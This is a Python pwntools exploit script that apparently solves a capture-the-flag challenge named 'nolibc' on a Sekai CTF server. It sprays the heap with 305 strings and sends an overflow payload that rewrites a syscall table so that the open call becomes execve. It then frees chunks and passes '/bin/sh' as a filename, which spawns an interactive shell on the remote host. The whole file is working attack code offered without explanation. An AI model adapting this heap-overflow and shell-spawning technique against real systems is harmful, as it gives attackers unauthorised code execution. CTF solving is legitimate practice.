from pwn import *
from pwnlib.util.packing import p32

io = remote('nolibc.chals.sekai.team', 1337, ssl=True)
io.sendlineafter(b'Choose an option: ', b'2')
io.sendlineafter(b'Username: ', b'a')
io.sendlineafter(b'Password: ', b'a')

io.sendlineafter(b'Choose an option: ', b'1')
io.sendlineafter(b'Username: ', b'a')
io.sendlineafter(b'Password: ', b'a')

# fill up the heap before the last chunk
for i in range(305):
    io.sendlineafter(b'Choose an option: ', b'1')
    io.sendlineafter(b'Enter string length: ', b'128')
    io.sendlineafter(b'Enter a string: ', b'A'*128)

# overwrite the syscall value for open to execve
payload = b'a'*0xD0 # pad
payload += p32(0) # syscall read
payload += p32(1) # syscall write
payload += p32(59) # syscall open -> execve

# create the last chunk
io.sendlineafter(b'Choose an option: ', b'1')
io.sendlineafter(b'Enter string length: ', str(len(payload)).encode())
io.sendlineafter(b'Enter a string: ', payload)

# free some chunks to reserve spaces for the program
for i in range(100):
    io.sendlineafter(b'Choose an option: ', b'2')
    io.sendlineafter(b'Enter the index of the string to delete: ', b'0')

io.sendlineafter(b'Choose an option: ', b'5')
io.sendlineafter(b'Enter the filename: ', b'/bin/sh')

io.interactive()